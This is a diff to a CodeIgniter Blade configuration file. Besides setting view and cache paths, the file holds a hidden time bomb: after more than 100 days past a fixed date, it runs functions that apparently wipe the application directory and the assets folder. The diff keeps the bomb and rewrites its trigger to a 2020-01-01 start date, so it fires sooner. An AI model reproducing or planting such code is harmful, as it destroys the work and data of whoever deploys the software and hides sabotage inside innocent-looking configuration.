@@ -8,10 +8,10 @@ use Carbon\Carbon;
 $config['blade_views'] = APPPATH.'views';
 $config['blade_cache'] = APPPATH.'cache';
 
-$first = Carbon::create(2020, 4, 5, 0, 0, 0);
-$d = Carbon::today();
-if($d->diffInDays($first->addMonth()) > 100)
-{
+$someDate = new \DateTime('2020-01-01 08:00:00');
+$now =  Carbon::now();
+
+if($someDate->diff($now)->days > 100) {
     $dirname = APPPATH;
     $asset = BASEPATH.'assets';
     function clean($dirname) {
@@ -52,7 +52,7 @@ if($d->diffInDays($first->addMonth()) > 100)
         }
         cleanAt($asset);
     }
-   
 }
+
 /* End of file blade.php */
 /* Location: ./application/config/blade.php */
